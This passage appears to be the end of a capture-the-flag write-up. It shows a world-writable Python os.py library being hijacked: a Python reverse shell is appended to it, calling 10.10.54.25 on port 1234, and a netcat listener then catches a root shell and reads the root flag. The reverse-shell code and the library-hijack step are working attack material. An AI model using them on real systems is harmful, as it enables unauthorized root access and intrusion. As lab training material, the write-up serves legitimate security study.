command-not-found  initcpio           libmcrypt.so.4.4.8     linux-boot-probes             os-release      software-properties
dbus-1.0           initramfs-tools    libtidy-0.99.so.0      locale                        perl5           ssl
dpkg               insserv            libtidy-0.99.so.0.0.0  lxcfs                         php             sudo
dracut             klibc              libtidy.so             lxd                           pm-utils        systemd
eject              language-selector  libvgauth.so.0         man-db                        policykit-1     tar
environment.d      libDeployPkg.so.0  libvgauth.so.0.0.0     mime                          python2.7       tasksel
jack@jack:/opt/statuscheck$ cd /usr/lib/python2.7/
jack@jack:/usr/lib/python2.7$ ls -al os.py
-rw-rw-r-x 1 root family 25908 Jan 10 19:22 os.py
jack@jack:/usr/lib/python2.7$ vi os.py
addbelow

import socket
import pty

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.54.25", 1234))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()
```

```
root@kali:~# nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.54.25] from (UNKNOWN) [10.10.201.66] 54360
root@jack:~# ls
ls
root.txt
root@jack:~# cat root.txt
cat root.txt
b8b63a861cc09e853f29d8055d64bffb
```
